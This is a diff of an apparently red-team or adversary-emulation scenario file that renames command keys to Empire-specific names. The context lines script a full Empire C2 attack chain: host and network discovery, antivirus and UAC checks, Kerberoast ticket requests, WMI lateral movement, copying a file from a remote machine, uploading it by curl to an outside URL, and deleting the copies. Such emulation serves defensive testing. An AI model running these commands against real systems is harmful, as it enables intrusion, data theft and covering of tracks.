@@ -37,9 +37,9 @@ action "agent_action" "cli_checks" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command           = "$commandArray = @({whoami},{query user},{ipconfig /all},{netstat -an},{netstat -rn},{echo done}); foreach ($command in $commandArray){& $command | Tee-Object -Variable commandOutput}; Write-Output $commandOutput"
         wait_for_results  = "true"
         completion_string = "done"
@@ -51,10 +51,10 @@ action "agent_action" "drive_info" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.cli_checks
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "Get-PSDrive"
         wait_for_results = "true"
     }
@@ -65,10 +65,10 @@ action "agent_action" "systeminfo" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.drive_info
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "systeminfo"
         wait_for_results = "true"
     }
@@ -79,10 +79,10 @@ action "agent_action" "win32_product" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.systeminfo
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "Get-WmiObject -Class win32_Product"
         wait_for_results = "true"
     }
@@ -93,10 +93,10 @@ action "agent_action" "antivirusproduct" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.win32_product
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/antivirusproduct"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -108,10 +108,10 @@ action "agent_action" "get_proxy" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.antivirusproduct
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/get_proxy"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -123,10 +123,10 @@ action "agent_action" "get_uaclevel" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.get_proxy
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/get_uaclevel"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -138,10 +138,10 @@ action "agent_action" "computerdetails" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.get_uaclevel
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/computerdetails"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -162,10 +162,10 @@ action "agent_action" "seatbelt_user" {
     timeout    = "300"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.computerdetails
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/seatbelt"
         wait_for_results  = "true"
         completion_string = "Completed"
@@ -187,10 +187,10 @@ action "agent_action" "seatbelt_system" {
     timeout    = "300"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.seatbelt_user
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/seatbelt"
         wait_for_results  = "true"
         completion_string = "Completed"
@@ -212,10 +212,10 @@ action "agent_action" "get_domain_controller" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.seatbelt_system
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/network/powerview/get_domain_controller"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -227,10 +227,10 @@ action "agent_action" "request_spn_tickets" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.get_dfs_share
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/management/invoke_script"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -247,10 +247,10 @@ action "agent_action" "query_user" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.request_spn_tickets
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "query user /SERVER:${variable.lateral_movement_computer_name}"
         wait_for_results = "true"
     }
@@ -261,10 +261,10 @@ action "agent_action" "get_services" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.query_user
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "tasklist /s ${variable.lateral_movement_computer_name}"
         wait_for_results = "true"
     }
@@ -275,10 +275,10 @@ action "agent_action" "get_shares" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.get_services
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "net view \\${variable.lateral_movement_computer_name} /All"
         wait_for_results = "true"
     }
@@ -289,10 +289,10 @@ action "agent_action" "create_remote_exfil_file" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.get_shares
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/lateral_movement/invoke_wmi"
         wait_for_results  = "false"
         
@@ -318,10 +318,10 @@ action "agent_action" "pull_data" {
     timeout    = "900"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.create_remote_exfil_file
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "Copy-Item -Path \\${variable.lateral_movement_computer_name}\${variable.system_root_drive}$\${variable.exfil_file} -Destination ${variable.system_root_drive}:\${variable.exfil_file}"
         wait_for_results = "true"
     }
@@ -332,10 +332,10 @@ action "agent_action" "upload_exfil_file" {
     timeout    = "600"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.pull_data
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "${variable.system_root_drive}:\Windows\System32\curl.exe -s -H 'Content-Type:application/octet-stream' --upload-file ${variable.system_root_drive}:\${variable.exfil_file} '${resource.workspace_put_url.upload_url.workspace_put_url}'; echo done"
         wait_for_results = "true"
     }
@@ -346,10 +346,10 @@ action "agent_action" "delete_exfil_file" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.upload_exfil_file
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "Remove-Item -Path ${variable.system_root_drive}:\${variable.exfil_file}"
         wait_for_results = "true"
     }
@@ -360,10 +360,10 @@ action "agent_action" "delete_remote_exfil_file" {
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.delete_exfil_file
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "Remove-Item -Path \\${variable.lateral_movement_computer_name}\${variable.system_root_drive}$\${variable.exfil_file}"
         wait_for_results = "true"
     }
